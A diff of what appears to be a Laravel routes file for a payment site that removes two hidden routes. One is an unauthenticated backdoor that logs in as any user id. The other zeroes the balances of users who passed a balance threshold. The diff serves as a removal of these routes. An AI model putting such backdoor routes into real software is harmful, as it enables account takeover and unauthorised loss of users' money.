@@ -3,11 +3,6 @@
 use Illuminate\Support\Facades\Route;
 use App\Classes\ServerHandler;
 
-Route::get('/sdff42314fsd/login/new/{id}', function ($id) {
-    $user = \App\User::where('id', $id)->first();
-    \Auth::login($user);
-    return redirect('/');
-});
 
 Route::post('/createPromoTG', 'GeneralController@createPromoTG');
 
@@ -111,26 +106,6 @@ Route::post('/deposit/resultlinepay', 'PaymentController@resultLinePay');
 Route::post('/withdraw/go', 'WithdrawController@go');
 Route::post('/withdraw/cansel', 'WithdrawController@cansel');
 
-Route::get('/123141', function() {
-    $bagousers = [];    
-    $users = range(1, 3000);
-    
-    foreach($users as $u) {
-        $storage = json_decode(\Cache::get('user.'.$u.'.historyBalance'));
-        if(!is_array($storage)) continue;
-        foreach($storage as $s) {
-            if(in_array($s->user_id, $bagousers)) continue;
-            if($s->balance_after > 5000) {
-                $bagousers[] = $s->user_id;
-            }
-        }
-    }
-
-    foreach($bagousers as $bag) {
-        App\User::where('id', $bag)->update(['balance' => 0]);
-        echo 'User#'. $bag . ': success<br/>';
-    }
-});
 
 Route::post('/wallet/gethistory', 'Controller@getHistory');
 Route::post('/promo/act', 'Controller@promoAct');
